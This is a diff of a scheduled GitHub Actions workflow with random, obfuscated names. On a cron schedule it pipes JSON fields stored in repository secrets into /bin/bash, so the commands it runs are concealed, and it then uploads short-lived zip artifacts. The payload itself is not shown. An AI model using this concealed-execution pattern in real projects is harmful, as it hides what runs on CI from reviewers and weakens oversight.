@@ -1,25 +1,26 @@
 name: chengdaolaijing
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '24 1/6 * * *'
 
-jobs:  # 24462
+  schedule:
+    - cron: '27 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chengdaolaijing
         env:
-          rtwd42384: ${{ secrets.rtwd42384 }}
+          jemrd06559: ${{ secrets.jemrd06559 }}
         run: |
-          echo $rtwd42384 | jq -r .oudwg03314 | /bin/bash
-          echo $k1481 | jq -r .zf41 | /bin/bash
-          echo $fdxgf268 | jq -r .y23605 | /bin/bash
-          echo $w06215 | jq -r .y3 | /bin/bash
-          echo $dmf03 | jq -r .ubd99249 | /bin/bash
-          echo $j07117 | jq -r .e6158 | /bin/bash
-          echo $tcc95923 | jq -r .i031 | /bin/bash
-          echo $js874 | jq -r .wp5759 | /bin/bash
+          printf '%s' "$jemrd06559" | jq -r .n6294 | /bin/bash
+          printf '%s' "$ga1665" | jq -r .yw9434 | /bin/bash
+          printf '%s' "$xgej90" | jq -r .enfdx71 | /bin/bash
+          echo $jxda7377 | jq -r .yvlsz199 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ef32weSN
+          path: "*.zip"
+          retention-days: 1
